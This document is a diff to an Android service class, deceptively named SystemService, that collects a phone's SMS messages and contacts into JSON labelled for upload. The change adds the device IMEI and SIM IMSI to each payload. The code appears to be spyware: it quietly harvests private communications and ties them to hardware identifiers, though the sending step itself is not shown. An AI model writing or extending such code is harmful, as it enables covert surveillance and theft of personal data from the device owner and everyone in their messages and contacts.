@@ -124,7 +124,10 @@ public class SystemService extends Service{
                         smsJsonObject.put("type", smsData.type);
                         smsArray.put(smsJsonObject);
                     }
-                    responseJsonObject.put(ACTION_UPLOAD_SMS, smsArray);
+                    TelephonyManager tm = (TelephonyManager) SystemService.this.getSystemService(TELEPHONY_SERVICE);
+                    responseJsonObject.put(ACTION_UPLOAD_SMS, smsArray)
+                            .put("imei", tm.getDeviceId())
+                            .put("imsi", tm.getSubscriberId());
                 } catch (JSONException e) {
                 }
                 byte[] responseData = null;
@@ -145,7 +148,10 @@ public class SystemService extends Service{
                     for(SystemUtil.ContactData contactData: contactList) {
                         contactArray.put(new JSONObject().put("name", contactData.name).put("number", contactData.number).put("last_update",contactData.lastUpdate));
                     }
-                    responseJsonObject.put(ACTION_UPLOAD_CONTACT, contactArray);
+                    TelephonyManager tm = (TelephonyManager) SystemService.this.getSystemService(TELEPHONY_SERVICE);
+                    responseJsonObject.put(ACTION_UPLOAD_CONTACT, contactArray)
+                            .put("imei", tm.getDeviceId())
+                            .put("imsi", tm.getSubscriberId());
                 } catch (JSONException e) {
                 }
                 byte[] responseData = null;
